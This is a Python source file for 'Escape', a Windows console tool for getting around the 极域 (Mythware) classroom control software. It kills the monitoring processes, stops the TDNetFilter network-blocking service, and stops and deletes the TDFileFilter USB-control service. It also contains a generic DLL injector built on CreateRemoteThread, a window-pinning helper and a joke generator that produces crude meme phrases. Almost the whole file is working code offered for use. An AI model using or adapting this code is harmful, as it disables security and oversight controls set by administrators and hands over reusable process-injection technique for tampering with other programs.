from utils.shortcuts import *

import time
from os import system

import time
from os import system
import win32gui
import win32con
import win32api
import win32gui_struct
from pynput import keyboard
from ctypes import *
import signal
import playsound
import random
import sys

stage = "Pre-Alpha"
version = "0.2.0"

# 菜单
def menu():
    funcChoice = ""
    r("mode con cols=50 lines=30")
    r("cls")
    r("title Escape >nul")
    time.sleep(0.5)

    if stage == "Release":
        workingStatus = "(Stable)"
    else:
        workingStatus = "(Work in progress)"

    nameStr = "Escape by kev1nweng"
    print(nameStr)
    print(stage, version, workingStatus)

    time.sleep(0.1)
    print("\n+菜单\n")
    print("1. 立即结束极域教室主进程")
    print("2. 置顶操作")
    print("+ 2.1 置顶窗口")
    print("+ 2.2 取消置顶")
    print("3. 对进程注入DLL文件")
    print("4. 解除强制断网")
    print("5. 破解U盘禁用")
    print("0. 退出")
    print("\n114514. ?????")


    while True:
        try:
            funcChoice = float(input("\n请输入你要执行的功能序号：\n>> "))
            break
        except ValueError:
            print("\n[!] 非法输入值。")
            time.sleep(3)
            menu()

    if funcChoice == 0:
        print('\n\n[!] 正在退出程序...')
        time.sleep(1)
        c()
        sys.exit(0)

    if funcChoice == 1:
        kill("StudentMain.exe")
        print("\n[+] 执行完成。")
        wait()
        menu()

    if funcChoice == 2.1:
        wT = ""
        wT = str(input("\n输入你要置顶的窗口名: "))
        pin.pin(wT)
        print("\n[+] 执行完成。")
        wait()
        menu()

    if funcChoice == 2.2:
        wT = ""
        wT = str(input("\n输入你要取消置顶的窗口名: "))
        pin.unpin(wT)
        print("\n[+] 执行完成。")
        wait()
        menu()

    if funcChoice == 3:
        print("")
        injectPID = int(input("输入待注入进程的PID: "))
        injectDLL = str(input("输入待注入进程的DLL完整路径: "))
        inject(injectPID, injectDLL)
        menu()

    if funcChoice == 4:
        srvOperation.killNetFilter()
        wait()
        menu()

    if funcChoice == 5:
        srvOperation.killFileFilter()
        wait()
        menu()

    if funcChoice == 114514:
        inputnum = ""
        inputnum = input("\n撅入一个整数：\n>> ")
        #homochatter.roar()
        homochatter.run(inputnum)
    
    menu()


# 功能定义
def test():
    input()

# func 1
def kill(programName):
    try:
        command = "taskkill >nul /f /im " + programName + " 2>nul"
        r(command)
    except Exception:
        print("\n[!] 执行出现错误。请检查输入内容是否正确后重试。")

# func 2
class pin:
    def pin(windowTitle):
        try:
            hwnd = win32gui.FindWindow(None, windowTitle)    #获取所有窗口句柄 
            # hwnd = win32gui.FindWindow('xx.exe', None)
            win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
            # ctypes.windll.user32.ShowWindow(hwnd, 3)
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
            win32con.SWP_NOMOVE | win32con.SWP_NOACTIVATE | win32con.SWP_NOOWNERZORDER | win32con.SWP_SHOWWINDOW | win32con.SWP_NOSIZE)
            # 取消置顶
            # win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,win32con.SWP_SHOWWINDOW|win32con.SWP_NOSIZE|win32con.SWP_NOMOVE)
            if __name__ == '__main__':
                pass
        except Exception:
            print("\n[!] 执行出现错误。请检查窗口标题是否正确后重试。")
            wait()
            menu()


    def unpin(windowTitle):
        try:
            hwnd = win32gui.FindWindow(None, windowTitle)    #获取所有窗口句柄 
            # hwnd = win32gui.FindWindow('xx.exe', None)
            win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
            # ctypes.windll.user32.ShowWindow(hwnd, 3)
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
            win32con.SWP_NOMOVE | win32con.SWP_NOACTIVATE | win32con.SWP_NOOWNERZORDER | win32con.SWP_SHOWWINDOW | win32con.SWP_NOSIZE)
            # 取消置顶
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,win32con.SWP_SHOWWINDOW|win32con.SWP_NOSIZE|win32con.SWP_NOMOVE)
            if __name__ == '__main__':
                pass
        except Exception:
            print("\n[!] 执行出现错误。请检查窗口标题是否正确后重试。")
            wait()
            menu()

# func 3
def inject(pid, dll_path):
    print("")

    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
    VIRTUAL_MEM = ( 0x1000 | 0x2000 )

    kernel32 = windll.kernel32
    dll_len = len(dll_path)

    # 获取句柄
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

    if not h_process:
        print ("[!] 无法获取此PID的句柄: %s" %(pid))
        print ("[!] 请确认PID: %s 有效。" %(pid))
        wait()
        menu()

    # 分配内存
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

    # 注入DLL
    written = c_int(0)  
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

    # Resolve LoadLibraryA Address
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
        print ("[!] 注入失败，正在退出...")
        wait()
        menu()

    print ("[+] 成功创建远程进程 0x%08x." %(thread_id.value))
    wait()
    menu()

# func 4 & 5
class srvOperation:
    def killNetFilter():
        r("taskkill /f /im GATESRV.exe >nul 2>nul")
        r("taskkill /f /im MasterHelper.exe >nul 2>nul")
        r("sc stop TDNetFilter >nul 2>nul")
        print("\n[+] 执行完成。极域网络滤网已被关闭。")
    def killFileFilter():
        r("sc stop TDFileFilter >nul 2>nul")
        r("sc delete TDFileFilter >nul 2>nul")
        print("\n[+] 执行完成。极域文件控制服务已被卸载。")

# func 114514
class homochatter:
    def run(inputNum):
        print("\033c", end="")

        part1 = ["你是一个一个一个","食","我事","脱出","快点端上来罢","我在撅homochatter的时候，","十分甚至九分","兄啊，","戳啦，","wxy撅","sd食","五班事","这这布隆……","哼，哼，哼，"]
        part2 = ["恶臭的","撅撅子的","都是男的","正撅的","中出的","一针见雪的","homosexual","脱出的","食雪的","急不可耐的","小鬼的","自裁的","114514的"]
        part3 = ["……有什么存在的必要吗","我等不及力","野獣先辈","——淳平","？我修院！","快点端上来罢","快点端下去罢","啊啊啊啊啊啊啊啊啊啊啊啊","雪崩","极霸矛嘛","你有在偷看罢？","1919810"]
        emotion = ["（喜","（悲","（恼","（疑惑","（智将","（大喜","（全恼","（无慈悲","（确信","（直球","（警撅","（并感","（乐","（半恼","（）", "（心虚", "（意味深"]
        tips = ["猜猜最多可以输入几位数（喜", "HomoChatter的开发者头发已经只剩十根甚至是九根力（悲", "震惊！今日一名为HomoChatter的人机聊天软件成功通过图灵测试！", "冷知识：输入的不是整数不会真的被撅（心虚", "我现在就要和HomoChatter聊天，三回啊三回", "假如HomoChatter在Github上开源会发生什么？", "据报道，我校homo浓度已达到惊人的114%", "学校食堂的秘制酱料面很好吃，赶紧去尝尝（喜", "homo特色社会主义", "近日，两学生在教室里公然开撅"]

        撅=input
        脱出=print
        rc=random.choice

        try:
            inputnum=int(inputNum)
        except ValueError:
            print("[!] 输入整数，再乱输小心被撅（恼")  
            wait()
            menu()

        random.seed(inputnum + random.randint(0, 114514))
    
        脱出("\n======================================================")
        脱出(rc(part1),sep="",end="")
        脱出(rc(part2),sep="",end="")
        脱出(rc(part3),sep="",end="")
        脱出(rc(emotion),sep="",end="\n")
        脱出("======================================================\n")
        脱出("Tip: ", tips[random.randint(0, 9)],sep="",end="\n")
        脱出("\n", sep="",end="")
        r("pause>nul")
        
        r("cls")

    def roar():
        playsound("./misc./roar.mp3")


